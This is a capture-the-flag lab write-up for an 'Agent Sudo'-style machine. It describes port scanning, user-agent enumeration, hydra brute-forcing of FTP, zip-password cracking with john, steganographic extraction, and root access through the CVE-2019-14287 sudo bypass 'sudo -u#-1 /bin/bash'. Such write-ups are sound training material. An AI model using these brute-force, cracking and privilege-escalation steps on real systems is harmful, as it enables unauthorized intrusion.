Starting off with a normal scan: `nmap -sCV -v -oN` gives us information on 3 ports:

| Port   | Service               | Version       | Description                                        |
| ------ | --------------------- | ------------- | -------------------------------------------------- |
| 80/tcp | Apache httpd (Ubuntu) | 2.4.29        | Apache web server supporting GET HEAD POST OPTIONS |
| 22/tcp | ssh                   | OpenSSH 7.6p1 | SSH                                                |
| 21/tcp | ftp                   | vsftpd 3.0.3  | FTP served using vsftpd                            | 

Looking at the webserver, we need to send a codename as the `user-agent` in a request to access a secret page.

![[Pasted image 20231029150714.png]]

When we use `user-agent: R` we get a hint which suggests we are looking for a limited number of agents:
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

Using Berp Intruder, I iterated through the capitalised alphabet and what do you know... `user-agent: C` redirects us to a new page!
![[Pasted image 20231029151546.png]]

Now we know a possible username: `chris` we can attempt to brute-force the FTP credentials, using hydra we get out: `login: chris    password: crystal`.

Login in via FTP we can get 3 files (2 image files of aliens, and a text file containing a message to agent J):
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Doing an `exiftool cutie.png` suggests a warning that `Trailer data after PNG IEND chunk` exists. This is worth investigating as some data could be hidden here. Looking at the hex of this picture with `xxd cutie.png` we see a reference `To_agentR.txt`. It seems like there is a text file embedded in this image. Using `binwalk cutie.png` we can see there is a Zip archive hidden inside the image.

Once extracted we can see that inside the Zip is the `To_agentR.txt` file but it is locked behind a password. Time to brute force it.

Preparing with `zip2john 8702.zip > hash.txt` we can obtain the hash of the zip ready for `john hash.txt`. Revealing the file password is `alien`. Unlocking the file tells us:
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Base64'ing that string reveals it as `Area51`. Looking into the other image, maybe something is hidden in there? Running `steghide extract -sf cute-alien.jpg -p Area51` we extract a `message.txt`, reading:
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Interestingly we now have a new name and password... Maybe they also have an FTP login?
After trying to login via FTP it failed so maybe its an SSH login?

Successfully logged into SSH with `james` and `hackerrules!` . First we can find the user flag in the home dir. Finally privilege escalation is required to access the root dirs. Some information gathering of the system can point us in the right direction for finding a priv esc: 

`cat /etc/*-release`
```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```

`sudo -l`
```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
The `(ALL, !root) /bin/bash` seems interesting... What this is telling us is that the user cannot run `/bin/bash` as root `(!root)`. This is explitable under https://nvd.nist.gov/vuln/detail/CVE-2019-14287.

It suggests that the specification is:
```
root    ALL=(ALL:ALL) ALL
james   ALL=(ALL,!root) /bin/bash
```
With ALL specified it means that a user (james) can run /bin/bash as any user they wish. Therefore we can choose to run `/bin/bash` as the root user which will be allowed.

`sudo -u#-1 /bin/bash` in this version of sudo, specifying the user id as `-1` or `4294967295` are resolved to `0`, which is the user ID for `root`. 

Finally we have gained full root access and retrieved the final flag found under the `/root` dir.